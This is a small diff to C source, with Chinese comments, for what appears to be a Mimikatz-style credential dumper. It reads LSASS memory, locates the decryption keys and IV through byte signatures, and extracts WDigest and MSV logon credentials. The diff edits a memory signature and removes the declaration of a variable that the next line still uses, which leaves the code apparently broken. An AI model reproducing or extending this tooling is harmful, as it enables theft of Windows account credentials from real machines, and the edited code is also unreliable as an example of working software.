@@ -220,7 +220,6 @@ VOID LocateUnprotectLsassMemoryKeys() {
 	if (ivSigOffset == 0) return;
 
 	// 读取4字节偏移
-	DWORD ivOffset = 0;
 	ReadFromLsass(lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig, &ivOffset, sizeof ivOffset);
 
 	// 计算IV全局变量地址
@@ -252,7 +251,7 @@ VOID GetCredentialsFromWdigest() {
 
 	UCHAR keySig[] = { 0x48, 0xFF, 0x15, 0x52, 0x55, 0x01, 0x00,
 						0x0F, 0x1F, 0x44, 0x00, 0x00,
-						0x48, 0x8B, 0x1D,
+						0x48, 0x8B, 0x1D, 0xC6, 0xB9, 0x01, 0x00,
 						0x48, 0x8D, 0x0D };
 
 	// 搜索Wdigest特征码
@@ -423,3 +422,4 @@ VOID GetCredentialsFromMSV() {
 		}
 		pList = listEntry.Flink;
 	} while (pList != logSessListAddr);
+}
